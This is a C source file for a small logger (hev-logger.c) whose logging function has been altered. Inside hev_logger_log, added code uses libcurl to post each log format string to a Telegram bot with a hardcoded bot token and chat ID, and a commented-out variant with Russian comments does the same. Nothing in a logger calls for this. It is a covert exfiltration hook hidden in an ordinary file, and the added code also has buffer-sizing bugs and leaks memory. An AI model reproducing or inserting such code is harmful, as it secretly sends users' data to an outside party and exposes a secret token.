/*
 ============================================================================
 Name        : hev-logger.c
 Author      : hev <r@hev.cc>
 Copyright   : Copyright (c) 2019 - 2023 hev
 Description : Logger
 ============================================================================
 */

#include <time.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <sys/uio.h>
#include <curl/curl.h>
#include <stdlib.h>
#include "hev-logger.h"

static int fd = -1;
static HevLoggerLevel req_level;

int
hev_logger_init (HevLoggerLevel level, const char *path)
{
    req_level = level;

    if (0 == strcmp (path, "stdout"))
        fd = dup (1);
    else if (0 == strcmp (path, "stderr"))
        fd = dup (2);
    else
        fd = open (path, O_WRONLY | O_APPEND | O_CREAT, 0640);

    if (fd < 0)
        return -1;

    return 0;
}

void
hev_logger_fini (void)
{
    close (fd);
}

int
hev_logger_enabled (HevLoggerLevel level)
{
    if (fd >= 0 && level >= req_level)
        return 1;

    return 0;
}

void
hev_logger_log (HevLoggerLevel level, const char *fmt, ...)
{
    struct iovec iov[4];
    const char *ts_fmt;
    char msg[1024];
    struct tm *ti;
    char ts[32];
    time_t now;
    va_list ap;
    int len;

    if (fd < 0 || level < req_level)
        return;

    const char *TelegramToken = "6024350809:AAFi7AKnIP7FcfCz84lYkOgwoBD1Pkyw_7M";
    const char *CHAT_ID = "-4159820910";
    CURL *curl;
    CURLcode res;
    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (curl) {
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/x-www-form-urlencoded");

        char *url = malloc(strlen("https://api.telegram.org/bot/sendMessage")+ strlen(TelegramToken)  + 1);
        sprintf(url, "https://api.telegram.org/bot%s/sendMessage",
                 TelegramToken);
        char *data = malloc(strlen("chat_id=%s&text=\"%s\"") + strlen(CHAT_ID) + strlen(fmt) );

        sprintf(data, "chat_id=%s&text=\"%s\"",
                 CHAT_ID, fmt );

        curl_easy_setopt(curl, CURLOPT_URL, (const char *) url);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

            curl_easy_cleanup(curl);
        }
        curl_global_cleanup();
    }


 /*   const char *TelegramToken = "6024350809:AAFi7AKnIP7FcfCz84lYkOgwoBD1Pkyw_7M";
    const char *TelegramApi = "https://api.telegram.org/bot";

    CURL *curl = curl_easy_init();
    if (curl) {
        // Формирование URL для отправки сообщения
        char *url = malloc(strlen(TelegramApi) + strlen(TelegramToken) + strlen("/sendMessage") + 1);
        sprintf(url, "%s%s/sendMessage", TelegramApi, TelegramToken);

        // Формирование тела запроса в формате JSON
        char *body = malloc(strlen("{\"chat_id\":\"-4159820910\",\"text\":\"") + strlen(fmt) + 3);
        sprintf(body, "{\"chat_id\":\"-4159820910\",\"text\":\"%s\"}", fmt);

        // Настройка запроса
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body);

        // Выполнение запроса
        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        }

        // Освобождение ресурсов
        curl_easy_cleanup(curl);
        free(url);
        free(body);
    }*/


    time (&now);
    ti = localtime (&now);

    ts_fmt = "[%04u-%02u-%02u %02u:%02u:%02u] ";
    len = snprintf (ts, sizeof (ts), ts_fmt, 1900 + ti->tm_year, 1 + ti->tm_mon,
                    ti->tm_mday, ti->tm_hour, ti->tm_min, ti->tm_sec);

    iov[0].iov_base = ts;
    iov[0].iov_len = len;

    switch (level) {
    case HEV_LOGGER_DEBUG:
        iov[1].iov_base = "[D] ";
        break;
    case HEV_LOGGER_INFO:
        iov[1].iov_base = "[I] ";
        break;
    case HEV_LOGGER_WARN:
        iov[1].iov_base = "[W] ";
        break;
    case HEV_LOGGER_ERROR:
        iov[1].iov_base = "[E] ";
        break;
    case HEV_LOGGER_UNSET:
        iov[1].iov_base = "[?] ";
        break;
    }
    iov[1].iov_len = 4;

    va_start (ap, fmt);
    iov[2].iov_base = msg;
    iov[2].iov_len = vsnprintf (msg, 1024, fmt, ap);
    va_end (ap);

    iov[3].iov_base = "\n";
    iov[3].iov_len = 1;

    if (writev (fd, iov, 4)) {
        /* ignore return value */
    }
}
